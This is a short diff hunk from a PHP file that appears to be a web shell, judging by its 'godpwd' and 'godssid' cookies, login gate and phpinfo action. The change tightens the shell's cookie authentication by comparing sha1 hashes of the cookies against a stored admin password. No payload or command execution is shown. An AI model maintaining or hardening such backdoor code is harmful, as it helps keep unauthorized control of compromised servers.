@@ -52,10 +52,11 @@ $password2 = sha1($password);
 			p('<a style="font:12px Verdana" href="'.$self.'">Success</a>');
 			exit;
 		}
+	} else {
+		if($_COOKIE['godpwd'] && $_COOKIE['godssid']) {
+			if(sha1($_COOKIE['godssid']) != $admin['pass'] || sha1($_COOKIE['godpwd']) != $admin['pass']) loginpage();
+		} else loginpage();
 	}
-	if($_COOKIE['godpwd'] && $_COOKIE['godssid']) {
-		if($_COOKIE['godssid'] != $_COOKIE['godpwd']) loginpage();
-	} else loginpage();
 }
 $errmsg='';
 if($haz=='phpinfo') {
